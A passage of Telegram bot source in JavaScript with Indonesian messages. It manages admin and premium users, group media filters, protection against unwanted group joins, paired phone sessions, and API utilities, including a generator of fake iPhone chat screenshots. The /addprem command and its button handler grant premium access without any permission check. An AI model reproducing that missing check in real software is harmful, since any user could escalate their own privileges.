      "👑 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*",
      { parse_mode: "Markdown" }
    );
  }

  if (adminList.includes(targetUserId)) {
    return ctx.reply(
      `👑 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇ ⚠️ *SUDAH ADMIN* ⚠️\n` +
      `┇ \n` +
      `┇ 👤 User ID: \`${targetUserId}\`\n` +
      `┇ 📌 Sudah memiliki akses admin.\n` +
      `👑 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
      { parse_mode: "Markdown" }
    );
  }

  // Tambahkan admin
  addAdmin(targetUserId);

  // Tampilan sukses yang keren
  await ctx.reply(
    `🎉 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   👑 *ADMIN BERHASIL DITAMBAHKAN* 👑\n` +
    `┇\n` +
    `┇ 👤 *User ID:* \`${targetUserId}\`\n` +
    `┇\n` +
    `┇ 🎉 Selamat! User sekarang memiliki\n` +
    `┇    akses penuh sebagai admin!\n` +
    `┇\n` +
    `┇ 📌 Akses: *Semua command admin*\n` +
    `🎉 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*\n` +
    `\n_✨ User dapat menggunakan semua fitur admin sekarang!_`,
    { parse_mode: "Markdown" }
  );
});

// ========== COMMAND /addprem ==========
bot.command("addprem", async (ctx) => {
  let targetUserId;

  // Cek apakah reply ke pesan user
  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
      "🌸 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓* \n" +
      "┇ *✨ CARA PAKAI PREMIUM* ✨\n" +
      "┇ \n" +
      "┇ 📌 *Contoh:*\n" +
      "┇ `/addprem 1113570863`\n" +
      "┇ \n" +
      "┇ 📌 *Atau reply pesan user:*\n" +
      "┇ Ketik `/addprem` sambil reply\n" +
      "🌸 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*",
      { parse_mode: "Markdown" }
    );
  }

  if (premiumUsers.includes(targetUserId)) {
    return ctx.reply(
      `✨ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇ ⚠️ *SUDAH PREMIUM* ⚠️\n` +
      `┇ \n` +
      `┇ 👤 User ID: \`${targetUserId}\`\n` +
      `┇ 📌 Sudah memiliki akses premium.\n` +
      `✨ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
      { parse_mode: "Markdown" }
    );
  }

  // Tampilan pilihan durasi yang keren
  await ctx.reply(
    `🎬 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   ✨ *PREMIUM ACCESS* ✨\n` +
    `┇\n` +
    `┇ 👤 *User ID:* \`${targetUserId}\`\n` +
    `┇\n` +
    `┇ 🎁 Pilih durasi premium di bawah:\n` +
    `┇\n` +
    `🎬 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🌟 30 HARI", callback_data: `prem_30_${targetUserId}`, style: "primary" },
            { text: "⚡ 90 HARI", callback_data: `prem_90_${targetUserId}`, style: "success" },
            { text: "🔥 120 HARI", callback_data: `prem_120_${targetUserId}`, style: "danger" }
          ],
          [
            { text: "❌ BATAL", callback_data: "prem_cancel" }
          ]
        ]
      }
    }
  );
});

// ========== HANDLER ACTION (TAMPILAN SUKSES KEREN) ==========
bot.action(/prem_.+/, (ctx) => {
  const data = ctx.match[0];

  // Tombol batal
  if (data === "prem_cancel") {
    ctx.deleteMessage().catch(() => {});
    ctx.reply(
      `
\`\`\`ks      
      🌸 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇ ❌ *DIBATALKAN* ❌\n` +
      `┇\n` +
      `┇ Penambahan premium dibatalkan.\n` +
      `🌸 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*
\`\`\`      
      `,
      { parse_mode: "Markdown" }
    );
    return;
  }

  // Tombol pilih durasi
  if (data.startsWith("prem_")) {
    const parts = data.split("_");
    const duration = parts[1];
    const userId = parts[2];

    // Simpan ke premiumUsers
    if (!premiumUsers.includes(userId)) {
      premiumUsers.push(userId);
      saveJSON(premiumFile, premiumUsers);
    }

    // Pilihan gaya berdasarkan durasi
    let icon = "🌟";
    let gaya = "REGULER";
    if (duration === "90") {
      icon = "⚡";
      gaya = "SILVER";
    } else if (duration === "120") {
      icon = "🔥";
      gaya = "GOLD";
    }

    // Tampilan sukses yang keren
    ctx.editMessageText(
      `
      🎉 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇   ✨ *AKSES PAKET PREMIUM BERHASIL* ✨\n` +
      `┇\n` +
      `┇ ${icon} *Paket:* ${gaya} (${duration} Hari)\n` +
      `┇ 👤 *User ID:* \`${userId}\`\n` +
      `┇\n` +
      `┇ 🎉 Selamat! User sekarang memiliki\n` +
      `┇    akses premium!\n` +
      `┇\n` +
      `┇ 📅 Berlaku: ${duration} hari penuh\n` +
      `🎉 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*\n` +
      `\n_✨ Terima kasih sudah menggunakan layanan ini!_`,
      { parse_mode: "Markdown" }
    ).catch(() => {});
  }
});

// ========== COMMAND /deladmin (TAMPILAN KEREN & NO ERROR) ==========
bot.command("deladmin", checkOwner, async (ctx) => {
  let targetUserId;

  // Cek apakah reply ke pesan user
  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
      "🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n" +
      "┇ *✨ CARA PAKAI DELADMIN* ✨\n" +
      "┇ \n" +
      "┇ 📌 *Contoh:*\n" +
      "┇ `/deladmin 1113570863`\n" +
      "┇ \n" +
      "┇ 📌 *Atau reply pesan user:*\n" +
      "┇ Ketik `/deladmin` sambil reply\n" +
      "🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*",
      { parse_mode: "Markdown" }
    );
  }

  // Cek apakah user ada di daftar admin
  if (!adminList.includes(targetUserId)) {
    return ctx.reply(
      `⚠️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇ ❌ *BUKAN ADMIN* ❌\n` +
      `┇ \n` +
      `┇ 👤 User ID: \`${targetUserId}\`\n` +
      `┇ 📌 User ini tidak terdaftar sebagai admin.\n` +
      `⚠️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
      { parse_mode: "Markdown" }
    );
  }

  // Hapus admin
  removeAdmin(targetUserId);

  // Tampilan sukses yang keren
  await ctx.reply(
    `🗑️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   👑 *ADMIN BERHASIL DIHAPUS* 👑\n` +
    `┇\n` +
    `┇ 👤 *User ID:* \`${targetUserId}\`\n` +
    `┇\n` +
    `┇ 🚫 User sudah tidak memiliki\n` +
    `┇    akses admin lagi.\n` +
    `┇\n` +
    `┇ 📌 Akses admin telah dicabut.\n` +
    `🗑️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*\n` +
    `\n_✨ User sekarang menjadi user biasa._`,
    { parse_mode: "Markdown" }
  );
});

// ========== COMMAND /delprem (TAMPILAN KEREN & NO ERROR) ==========
bot.command("delprem", checkAdmin, async (ctx) => {
  let targetUserId;

  // Cek apakah reply ke pesan user
  if (ctx.message.reply_to_message) {
    targetUserId = ctx.message.reply_to_message.from.id.toString();
  } else {
    const args = ctx.message.text.split(" ");
    targetUserId = args[1];
  }

  if (!targetUserId) {
    return ctx.reply(
      "💎 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n" +
      "┇ *✨ CARA PAKAI DELPREMIUM* ✨\n" +
      "┇ \n" +
      "┇ 📌 *Contoh:*\n" +
      "┇ `/delprem 1113570863`\n" +
      "┇ \n" +
      "┇ 📌 *Atau reply pesan user:*\n" +
      "┇ Ketik `/delprem` sambil reply\n" +
      "💎 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*",
      { parse_mode: "Markdown" }
    );
  }

  // Cek apakah user ada di daftar premium
  if (!premiumUsers.includes(targetUserId)) {
    return ctx.reply(
      `⚠️ *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇ ❌ *BUKAN PREMIUM* ❌\n` +
      `┇ \n` +
      `┇ 👤 User ID: \`${targetUserId}\`\n` +
      `┇ 📌 User ini tidak terdaftar sebagai premium.\n` +
      `⚠️ *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
      { parse_mode: "Markdown" }
    );
  }

  // Hapus premium
  premiumUsers = premiumUsers.filter(id => id !== targetUserId);
  saveJSON(premiumFile, premiumUsers);

  // Tampilan sukses yang keren
  await ctx.reply(
    `💎 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   ✨ *PREMIUM BERHASIL DIHAPUS* ✨\n` +
    `┇\n` +
    `┇ 👤 *User ID:* \`${targetUserId}\`\n` +
    `┇\n` +
    `┇ 🚫 User sudah tidak memiliki\n` +
    `┇    akses premium lagi.\n` +
    `┇\n` +
    `┇ 📌 Akses premium telah dicabut.\n` +
    `💎 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*\n` +
    `\n_✨ User sekarang menjadi user biasa._`,
    { parse_mode: "Markdown" }
  );
});

// ========== LIST FRAME MENU (PILIH PREMIUM ATAU ADMIN) ==========
bot.command("list", checkAdmin, async (ctx) => {
  await ctx.reply(
    `📋 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   *LIST MENU* 📋\n` +
    `┇\n` +
    `┇ Pilih daftar yang ingin dilihat:\n` +
    `┇\n` +
    `┇ 💎 Premium User\n` +
    `┇ 👑 Admin User\n` +
    `📋 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💎 LIST PREMIUM", callback_data: "show_premium", style: "primary" },
            { text: "👑 LIST ADMIN", callback_data: "show_admin", style: "success" }
          ],
          [
            { text: "🏠 BACK TO HOME", callback_data: "backmenu", style: "danger" },
          ]
        ]
      }
    }
  );
});

// Handler untuk list premium (DENGAN BACK HOME)
bot.action("show_premium", async (ctx) => {
  if (premiumUsers.length === 0) {
    await ctx.editMessageText(
      `💎 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇   📭 *LIST PREMIUM* 📭\n` +
      `┇\n` +
      `┇ ⚠️ Belum ada user premium.\n` +
      `💎 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🏠 BACK TO HOME", callback_data: "backmenu", style: "danger" }],
            [{ text: "◀️ KEMBALI", callback_data: "list_back", style: "success" }]
          ]
        }
      }
    );
    return;
  }

  let userList = "";
  for (let i = 0; i < premiumUsers.length; i++) {
    userList += `┇ ${i + 1}. ✨ \`${premiumUsers[i]}\`\n`;
  }

  await ctx.editMessageText(
    `💎 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   👑 *LIST PREMIUM USER* 👑\n` +
    `┇\n` +
    `${userList}` +
    `┇\n` +
    `┇ 📊 *Total:* ${premiumUsers.length} User\n` +
    `💎 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🏠 BACK TO HOME", callback_data: "backmenu", style: "danger" }],
          [{ text: "◀️ KEMBALI", callback_data: "list_back", style: "success" }]
        ]
      }
    }
  );
});

// Handler untuk list admin (DENGAN BACK HOME)
bot.action("show_admin", async (ctx) => {
  if (adminList.length === 0) {
    await ctx.editMessageText(
      `👑 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
      `┇   📭 *LIST ADMIN* 📭\n` +
      `┇\n` +
      `┇ ⚠️ Belum ada admin terdaftar.\n` +
      `👑 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🏠 BACK TO HOME", callback_data: "backmenu", style: "danger" }],
            [{ text: "◀️ KEMBALI", callback_data: "list_back", style: "success" }]
          ]
        }
      }
    );
    return;
  }

  let adminListText = "";
  for (let i = 0; i < adminList.length; i++) {
    adminListText += `┇ ${i + 1}. 👑 \`${adminList[i]}\`\n`;
  }

  await ctx.editMessageText(
    `👑 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   🛡️ *LIST ADMIN USER* 🛡️\n` +
    `┇\n` +
    `${adminListText}` +
    `┇\n` +
    `┇ 📊 *Total:* ${adminList.length} Admin\n` +
    `👑 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🏠 BACK TO HOME", callback_data: "backmenu", style: "danger" }],
          [{ text: "◀️ KEMBALI", callback_data: "list_back", style: "success" }]
        ]
      }
    }
  );
});

// Handler BACK ke menu list
bot.action("list_back", async (ctx) => {
  await ctx.editMessageText(
    `📋 *┏━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓*\n` +
    `┇   *LIST MENU* 📋\n` +
    `┇\n` +
    `┇ Pilih daftar yang ingin dilihat:\n` +
    `┇\n` +
    `┇ 💎 Premium User\n` +
    `┇ 👑 Admin User\n` +
    `📋 *┗━┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛*`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💎 LIST PREMIUM", callback_data: "show_premium", style: "primary" },
            { text: "👑 LIST ADMIN", callback_data: "show_admin", style: "success" }
          ],
          [
            { text: "🏠 BACK TO HOME", callback_data: "backmenu", style: "danger" },
          ]
        ]
      }
    }
  );
});

// Handler tutup
bot.action("close_list", async (ctx) => {
  await ctx.deleteMessage().catch(() => {});
});

// Handler BACK TO HOME (pastikan sudah ada)
bot.action("backmenu", async (ctx) => {
  await ctx.answerCallbackQuery().catch(() => {});
  await sendHome(ctx);
});

bot.command("antivideo", async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Hanya bisa di group");
    }

    const chatId = ctx.chat.id.toString();

    
    const member = await ctx.getChatMember(ctx.from.id);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args) {
      return ctx.reply("📌 Format: /antivideo on /off");
    }

  
    if (args === "on") {
      if (!antiVideoGroups.includes(chatId)) {
        antiVideoGroups.push(chatId);
        saveAntiVideo(antiVideoGroups);
      }
      return ctx.reply("✅ Anti video aktif di grup ini");
    }

   
    if (args === "off") {
      antiVideoGroups = antiVideoGroups.filter(id => id !== chatId);
      saveAntiVideo(antiVideoGroups);
      return ctx.reply("❌ Anti video dimatikan");
    }

    return ctx.reply("📌 Gunakan: /antivideo on /off");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.on("video", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiVideoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim video di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})


bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Hanya bisa di group")
  }

  
  const member = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini")
  }

  const args = ctx.message.text.split(" ")[1]
  if (!args) return ctx.reply("📌 Format: /antifoto on /off")

  const chatId = ctx.chat.id.toString()

  if (args === "on") {
    if (!antiFotoGroups.includes(chatId)) {
      antiFotoGroups.push(chatId)
      saveAntiFoto(antiFotoGroups)
    }
    return ctx.reply("✅ Anti foto aktif di grup ini")
  }

  if (args === "off") {
    antiFotoGroups = antiFotoGroups.filter(id => id !== chatId)
    saveAntiFoto(antiFotoGroups)
    return ctx.reply("❌ Anti foto dimatikan")
  }

  ctx.reply("📌 Gunakan: /antifoto on /off")
})

bot.on("photo", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiFotoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim foto di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("groupon", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("on");
  ctx.reply("👥 Group Only berhasil diaktifkan.");
});

bot.command("groupoff", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("off");
  ctx.reply("🌍 Group Only dimatikan.");
});

bot.command("mode", (ctx) => {
  ctx.reply(`⚙️ Mode saat ini: ${getMode().toUpperCase()}`);
});

bot.command("self", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("self");
  ctx.reply("🔒 Bot Di kunci Owner.");
});

bot.command("public", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("public");
  ctx.reply("🔓 Bot di buka oleh Owner.");
});

bot.command("delpair", async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;

  if (!isOwner(userId)) {
    return ctx.reply(
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("⚠️ Contoh: /delpair 628xxxx");
  }

  const botNumber = args[1].replace(/[^0-9]/g, "");

  let statusMessage = await ctx.reply(
`\`\`\`js
𝑿𝒊𝒍𝒆𝒏𝒕 𝑫𝒆𝒂𝒕𝒉 - 𝑳𝒐𝒂𝒅𝒊𝒏𝒈
ID: ${botNumber}
Status: Executing...\`\`\`
`,
    { parse_mode: "Markdown" }
  );

  try {
    const sock = sessions.get(botNumber);

    // 🔥 FIX UTAMA (ANTI BOT ZOMBIE)
    if (sock) {
      try {
        await sock.logout();
      } catch (e) {}

      try {
        sock.end?.();         // matiin koneksi
        sock.ws?.close?.();   // force close websocket
      } catch (e) {}

      sessions.delete(botNumber);
    }

    // 🔥 HAPUS FOLDER SESSION
    const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }

    // 🔥 UPDATE FILE SESSION
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      const updatedNumbers = activeNumbers.filter(
        (num) => num !== botNumber
      );
      fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
    }

    await ctx.telegram.editMessageText(
      chatId,
      statusMessage.message_id,
      null,
`\`\`\`js
𝑿𝒊𝒍𝒆𝒏𝒕 𝑫𝒆𝒂𝒕𝒉 - 𝑺𝒖𝒄𝒄𝒆𝒔
ID: ${botNumber}
Status: Berhasil di hapus!\`\`\`
`,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error(error);

    await ctx.telegram.editMessageText(
      chatId,
      statusMessage.message_id,
      null,
`\`\`\`js
𝑿𝒊𝒍𝒆𝒏𝒕 𝑫𝒆𝒂𝒕𝒉 - 𝑬𝒓𝒓𝒐𝒓
ID: ${botNumber}
Status: ${error.message}\`\`\`
`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.command("runtime", (ctx) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);

  ctx.reply(
`┏━━━〔 RUNTIME 〕━━━┓
┃ 🤖 Bot Active
┃ ⏳ ${h} Jam ${m} Menit ${s} Detik
┗━━━━━━━━━━━━━━━━━━┛`
  );
});

bot.command('setcd', async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner");

  const args = ctx.message.text.split(' ');
  if (!args[1]) return ctx.reply("⚠️ Contoh: /setcd 1s / 1m / 1h / 1d / 0");

  if (args[1] === "0") {
    COOLDOWN_TIME = 0;
    COOLDOWN_TEXT = "0s";
    return ctx.reply("✅ Cooldown dimatikan");
  }

  const time = parseCooldown(args[1]);
  if (!time) return ctx.reply("⚠️ Format salah!");

  COOLDOWN_TIME = time;
  COOLDOWN_TEXT = args[1];

  ctx.reply(`✅ Cooldown diubah ke ${COOLDOWN_TEXT}`);
});

bot.command("anticulik", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner!");

  const args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply("Gunakan:\n/anticulik on\n/anticulik off\n/anticulik autoreject");
  }

  if (args === "on") {
    antiCulik = true;
    autoReject = false;
    ctx.reply("✅ AntiCulik ON");
  } else if (args === "off") {
    antiCulik = false;
    ctx.reply("❌ AntiCulik OFF");
  } else if (args === "autoreject") {
    antiCulik = true;
    autoReject = true;
    ctx.reply("🚫 Auto Reject ON");
  }
});


bot.command("addsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Gunakan di group");
  }

  const id = ctx.chat.id.toString();

  if (whitelistGroups.includes(id)) {
    return ctx.reply("⚠️ Sudah SAFE");
  }

  whitelistGroups.push(id);
  saveSafe(whitelistGroups);

  ctx.reply("✅ Group SAFE");
});

bot.command("delsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  const id = ctx.chat.id.toString();

  whitelistGroups = whitelistGroups.filter(v => v !== id);
  saveSafe(whitelistGroups);

  ctx.reply("❌ SAFE dihapus");
});

bot.on("my_chat_member", async (ctx) => {
  try {
    const status = ctx.update.my_chat_member.new_chat_member.status;

    if (status !== "member" && status !== "administrator") return;
    if (!antiCulik) return;

    const chat = ctx.chat;
    const groupId = chat.id;
    const groupName = chat.title;

  
    if (isSafeGroup(groupId)) return;

    const from = ctx.update.my_chat_member.from;

    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak ada";
    const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

   
    if (autoReject) {
      try {
        await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
        await ctx.telegram.banChatMember(groupId, userId).catch(()=>{});
        await ctx.telegram.leaveChat(groupId);
      } catch {}
      return;
    }

   
    pendingGroups.set(groupId, {
      userId,
      username,
      fullName,
      groupName
    });

    
    for (let ownerId of loadOwner()) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
`🚨 BOT DICULIK

📛 Grup : ${groupName}
🆔 ID   : ${groupId}

👤 Pelaku:
• Nama     : ${fullName}
• Username : ${username}
• ID       : ${userId}`,
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ Izinkan", callback_data: `allow_${groupId}` },
                  { text: "❌ Tolak", callback_data: `deny_${groupId}` }
                ]
              ]
            }
          }
        );
      } catch {}
    }

  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
  }

  const action = ctx.match[1];
  const groupId = Number(ctx.match[2]);

  const data = pendingGroups.get(groupId);

  try { await ctx.deleteMessage(); } catch {}

  if (action === "allow") {
    pendingGroups.delete(groupId);

    await ctx.reply("✅ Bot diizinkan");

    try {
      await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner");
    } catch {}
  }

  if (action === "deny") {
    pendingGroups.delete(groupId);

    await ctx.reply("❌ Bot ditolak");

    try {
      await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");

      if (data?.userId) {
        await ctx.telegram.banChatMember(groupId, data.userId).catch(()=>{});
      }

      await ctx.telegram.leaveChat(groupId);
    } catch {}
  }
});
//// Tools ///
bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|can5y",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone ByXilent Death Kece ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});
 
// ========== COMMAND TIME (WIB, WITA, WIT) ==========
bot.command("time", async (ctx) => {
  const now = new Date();
  
  // WIB (UTC+7)
  const wib = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
  
  // WITA (UTC+8)
  const wita = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Makassar" }));
  
  // WIT (UTC+9)
  const wit = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jayapura" }));
  
  // Format jam
  const formatJam = (date) => {
    return date.toLocaleTimeString("id-ID", { 
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit',
      hour12: false
    });
  };
  
  // Format tanggal
  const formatTanggal = (date) => {
    return date.toLocaleDateString("id-ID", { 
      weekday: 'long', 
      day: 'numeric', 
      month: 'long', 
      year: 'numeric' 
    });
  };
  
  const pesan = 
`
<blockquote>
🕐 WAKTU SEKARANG 🕐

┌─────────────────┐
│ 🟢 WIB 
│    ${formatJam(wib)}
│    ${formatTanggal(wib)}
├─────────────────┤
│ 🟡 WITA
│    ${formatJam(wita)}
│    ${formatTanggal(wita)}
├─────────────────┤
│ 🔵 WIT
│    ${formatJam(wit)}
│    ${formatTanggal(wit)}
└─────────────────┘

✨ *Ketikan /start untuk kembali menu utama* ✨
</blockquote>
`;
  
  await ctx.reply(pesan, { parse_mode: "HTML" });
}); 
 
bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.zenzxz.my.id/maker/brat?text=${encodeURIComponent(text)}`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await ctx.replyWithSticker({
      source: Buffer.from(res.data)
    });

  } catch (e) {
    console.error("Error:", e.message);
    ctx.reply("❌ API error / tidak tersedia.");
  }
});

bot.command("snack", async (ctx) => {
  const text = ctx.message.text;
  const url = text.split(" ")[1];

  if (!url) {
    return ctx.reply("Contoh:\n/snack https://s.snackvideo.com/xxxx");
  }

  // validasi link dikit biar ga asal masukin sampah
  if (!url.includes("snackvideo")) {
    return ctx.reply("❌ Itu bukan link SnackVideo, jangan ngawur");
  }

  try {
    await ctx.reply("⏳ Lagi diproses... sabar dikit napa");

    const res = await axios.get(
      `https://api.shecodes.io/snackvideo?url=${encodeURIComponent(url)}`,
      { timeout: 15000 } // biar ga ngegantung
    );

    const video = res?.data?.data?.video;

    if (!video) {
      return ctx.reply("❌ Gagal ambil video, kemungkinan API nya lagi ngambek");
    }

    await ctx.replyWithVideo(
      { url: video },
      {
        caption: "✅ Beres. Udah, jangan spam lagi"
      }
    );

  } catch (err) {
    console.log("ERROR:", err.message);

